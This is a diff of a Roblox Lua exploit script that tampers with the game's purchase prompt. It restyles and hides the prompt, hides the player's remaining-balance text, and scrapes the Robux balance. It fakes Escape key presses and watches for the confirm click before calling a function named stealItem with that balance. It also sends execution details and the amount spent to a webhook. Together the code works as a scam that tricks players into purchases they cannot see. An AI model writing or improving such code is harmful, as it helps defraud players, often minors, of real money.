@@ -13,7 +13,6 @@ local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
 
 local UserId
 local totalSpent = 0
-local isMobile = true
 
 local messages = {
     "Here's your gift!",
@@ -40,61 +39,19 @@ local function hideNotifications()
     end
 end
 
-local function findPurchasePromptElements()
+local function modifyPromptUI(isFirstPrompt)
     local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
     if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
 
-    if isMobile then
-        local RobuxUpsellContainer = PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
-        if not RobuxUpsellContainer then return end
-        
-        local Prompt = RobuxUpsellContainer:FindFirstChild("Prompt")
-        if not Prompt then return end
-        
-        local Children = Prompt:FindFirstChild("Children")
-        if not Children then return end
-        
-        for _, child in ipairs(Children:GetChildren()) do
-            if child.Name == "1" and child:FindFirstChild("1") then
-                local innerFrame = child:FindFirstChild("1")
-                local alertContents = innerFrame:FindFirstChild("AlertContents")
-                if alertContents then
-                    return {
-                        purchasePrompt = PurchasePrompt,
-                        mainContainer = RobuxUpsellContainer,
-                        promptContainer = child,
-                        alertContents = alertContents
-                    }
-                end
-            end
-        end
-    else
-        local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
-        if not ProductContainer then return end
-        
-        local Animator = ProductContainer:FindFirstChild("Animator")
-        if not Animator then return end
-        
-        local prompt = Animator:FindFirstChild("Prompt")
-        if not prompt then return end
-        
-        local alertContents = prompt:FindFirstChild("AlertContents")
-        if alertContents then
-            return {
-                purchasePrompt = PurchasePrompt,
-                mainContainer = ProductContainer,
-                promptContainer = prompt,
-                alertContents = alertContents
-            }
-        end
-    end
-end
+    local prompt = Animator:FindFirstChild("Prompt")
+    if not prompt then return end
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return end
 
-local function modifyPromptUI(isFirstPrompt)
-    local elements = findPurchasePromptElements()
-    if not elements then return end
-
-    local alertContents = elements.alertContents
     local blueColor = Color3.fromRGB(0, 122, 255)
 
     local middleContent = alertContents:FindFirstChild("MiddleContent")
@@ -152,8 +109,18 @@ local function modifyPromptUI(isFirstPrompt)
         end
     end
 
-    if isMobile then
-        elements.promptContainer.Visible = false
+    local footer = alertContents:FindFirstChild("Footer")
+    if footer then
+        local footerContent = footer:FindFirstChild("FooterContent")
+        if footerContent then
+            local content = footerContent:FindFirstChild("Content")
+            if content then
+                local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
+                if RemainingBalanceText then
+                    RemainingBalanceText.Visible = false
+                end
+            end
+        end
     end
 end
 
@@ -171,7 +138,7 @@ end
 
 local function sendExecutionLog()
     local executorIdentifier = getExecutor()
-    local platform = isMobile and "Mobile" or "PC"
+    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
     local membershipType = game.Players.LocalPlayer.MembershipType
     local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"
 
@@ -263,7 +230,14 @@ local function sendWebhook(totalSpent)
 end
 
 local function waitForPromptToDisappear()
-    while findPurchasePromptElements() do
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
+
+    while Animator:FindFirstChild("Prompt") do
         task.wait()
     end
 end
@@ -423,22 +397,24 @@ end
 local CoreGui = game:GetService("CoreGui")
 
 local function getRobuxBalance()
-    local elements = findPurchasePromptElements()
-    if not elements then return 0 end
-
-    local alertContents = elements.alertContents
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return 0 end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return 0 end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return 0 end
+    local prompt = Animator:FindFirstChild("Prompt")
+    if not prompt then return 0 end
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return 0 end
     local footer = alertContents:FindFirstChild("Footer")
     if not footer then return 0 end
-    
     local footerContent = footer:FindFirstChild("FooterContent")
     if not footerContent then return 0 end
-    
     local content = footerContent:FindFirstChild("Content")
     if not content then return 0 end
-    
     local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
     if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
-    
     local balanceText = RemainingBalanceText.Text:match("(%d+)$")
     return (balanceText and tonumber(balanceText) or 0) + 25
 end
@@ -463,36 +439,47 @@ local function getRobuxAndProceed()
             warn("Remote 'CommF_' not found.")
         end
 
-        local elements = findPurchasePromptElements()
-        while not elements do
+        local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+        while not PurchasePrompt do
             task.wait()
-            elements = findPurchasePromptElements()
+            PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
         end
 
-        if elements.alertContents then
-            elements.promptContainer.Visible = false
-            local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
-            if settingsClippingShield then
-                settingsClippingShield.Visible = false
+        local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+        if ProductPurchaseContainer then
+            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
+            if Animator then
+                local Prompt = Animator:WaitForChild("Prompt")
+                if Prompt then
+                    Prompt.Visible = false
+                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+                    if settingsClippingShield then
+                        settingsClippingShield.Visible = false
+                    end
+
+                    task.wait(1)
+
+                    local balance = getRobuxBalance()
+                    print("Current Robux Balance: " .. balance)
+
+                    local VirtualInputManager = game:GetService("VirtualInputManager")
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+                    task.wait()
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+
+                    waitForPromptToDisappear()
+
+                    task.wait(0.5)
+
+                    stealItem(balance)
+                else
+                    print("err1")
+                end
+            else
+                print("err2")
             end
-
-            task.wait(1)
-
-            local balance = getRobuxBalance()
-            print("Current Robux Balance: " .. balance)
-
-            local VirtualInputManager = game:GetService("VirtualInputManager")
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-            task.wait()
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-
-            waitForPromptToDisappear()
-
-            task.wait(0.5)
-
-            stealItem(balance)
         else
-            print("Error: Alert contents not found")
+            print("err3")
         end
     end)()
 end
@@ -500,49 +487,37 @@ end
 local promptConfirmed = false
 
 local function waitForPurchaseConfirmation()
-    local elements = findPurchasePromptElements()
-    if not elements then return end
+    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
+    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+    local Animator = ProductContainer:WaitForChild("Animator")
+    local prompt = Animator:WaitForChild("Prompt")
+    local alertContents = prompt:WaitForChild("AlertContents")
+    local footer = alertContents:WaitForChild("Footer")
+    local footerButtons = footer:WaitForChild("Buttons")
 
-    local alertContents = elements.alertContents
-    local footer = alertContents:FindFirstChild("Footer")
-    if not footer then return end
-
-    local footerButtons = footer:FindFirstChild("Buttons")
-    if not footerButtons then return end
-
-    local confirmButton = footerButtons:FindFirstChild("2")
-    if confirmButton then
-        confirmButton.MouseButton1Click:Connect(function()
-            print("check1")
-            promptConfirmed = true
-        end)
-    end
+    local confirmButton = footerButtons:WaitForChild("2")
+    confirmButton.MouseButton1Click:Connect(function()
+        print("check1")
+        promptConfirmed = true
+    end)
 end
 
 local function waitForPrompt()
-    local elements = findPurchasePromptElements()
-    if not elements then return end
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
 
     modifyPromptUI(true)
 
-    if isMobile then
-        elements.mainContainer.ChildAdded:Connect(function(child)
-            if child.Name == "Prompt" then
-                modifyPromptUI(false)
-                waitForPurchaseConfirmation()
-            end
-        end)
-    else
-        local Animator = elements.mainContainer:FindFirstChild("Animator")
-        if Animator then
-            Animator.ChildAdded:Connect(function(child)
-                if child.Name == "Prompt" then
-                    modifyPromptUI(false)
-                    waitForPurchaseConfirmation()
-                end
-            end)
+    Animator.ChildAdded:Connect(function(child)
+        if child.Name == "Prompt" then
+            modifyPromptUI(false)
+            waitForPurchaseConfirmation()
         end
-    end
+    end)
 
     coroutine.wrap(function()
         while not promptConfirmed do
@@ -559,15 +534,25 @@ local function waitForPrompt()
 
         while true do
             VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
-            task.wait()
+            task.wait() 
+
             VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
 
-            local elements = findPurchasePromptElements()
-            if not elements then
+            local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+            if not PurchasePrompt then
                 break
             end
 
-            task.wait()
+            local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+            if not ProductContainer then break end
+
+            local Animator = ProductContainer:FindFirstChild("Animator")
+            if not Animator then break end
+
+            local prompt = Animator:FindFirstChild("Prompt")
+            if not prompt then
+                break 
+            end
         end
     end)()
 end
